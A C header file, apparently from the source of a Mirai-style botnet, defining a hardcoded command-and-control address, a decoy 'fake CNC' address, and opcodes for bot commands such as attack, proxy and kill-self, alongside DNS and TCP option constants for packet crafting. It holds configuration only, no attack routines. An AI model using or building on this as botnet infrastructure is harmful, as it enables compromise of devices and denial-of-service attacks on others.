#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/socket.h>

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define FALSE   0
#define TRUE    1
typedef char BOOL;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define SINGLE_INSTANCE_PORT 9811

#define CNC_ADDR 		INET_ADDR(10,3,107,88)
#define FAKE_CNC_ADDR   INET_ADDR(65,222,202,53)
#define FAKE_CNC_PORT   53

#define CNC_OP_PING         0x00
#define CNC_OP_KILLSELF     0x10
#define CNC_OP_KILLATTKS    0x20
#define CNC_OP_PROXY        0x30
#define CNC_OP_ATTACK       0x40



#define PROTO_DNS_QTYPE_A       1
#define PROTO_DNS_QCLASS_IP     1

#define PROTO_TCP_OPT_NOP   1
#define PROTO_TCP_OPT_MSS   2
#define PROTO_TCP_OPT_WSS   3
#define PROTO_TCP_OPT_SACK  4
#define PROTO_TCP_OPT_TSVAL 8

ipv4_t LOCAL_ADDR;